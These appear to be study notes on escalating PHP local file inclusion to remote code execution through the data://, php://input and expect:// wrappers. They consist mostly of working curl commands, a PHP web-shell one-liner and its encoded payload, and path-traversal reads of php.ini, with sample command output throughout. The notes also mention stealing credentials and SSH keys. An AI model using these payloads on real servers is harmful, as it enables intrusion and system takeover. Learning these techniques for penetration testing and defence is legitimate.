## 1- PHP Wrappers

We can exploit **file inclusion vulnerabilities** not only to read local files but also to **execute code remotely** on the back-end server.  
Common ways to gain control include:

- Finding credentials (e.g., from `config.php`) and reusing them for SSH.
- Reading `.ssh/id_rsa` keys if permissions are weak.

However, we can also achieve **Remote Code Execution (RCE)** directly using **PHP Wrappers**, depending on server configuration.
These are the **three main PHP wrappers** for code execution via LFI:
- `data://`
- `php://input`
- `expect://`

## Data Wrapper

The [`data`](https://www.php.net/manual/en/wrappers.data.php) wrapper allows including external data (like PHP code).  
- It only works if **`allow_url_include = On`** in `php.ini`.

To check this option on the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version

use LFI with the **base64 filter** to check this configuration: 
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decode and check the value:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep allow_url_include
  # allow_url_include = On
```
If it’s enabled, we can use `data://` to inject and execute PHP code.

Create a web shell and base64 encode it:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Then include it using the wrapper:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id" | grep uid
  # uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Input Wrapper
The [`input`](https://www.php.net/manual/en/wrappers.php.php) wrapper allows including **POST data** as PHP code.  
- It also depends on `allow_url_include = On`.

Send the shell code via POST and execute commands with GET:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- If our vulnerable parameter (ex. **?language=...**  ==did't  support the GET ,== put the command directly inside the PHP code, e.g. `<?php system('id'); ?>`.


## Expect Wrapper

The [`expect`](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows **direct command execution**.  
It must be **manually installed and enabled** in PHP.

Check if it’s active:
```bash
# get the conf file
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# check
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep expect
  # extension=expect  --> it enable 
```

If enabled, execute commands directly:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The `expect` wrapper provides **direct RCE** through LFI and is also useful in **XXE attacks**.

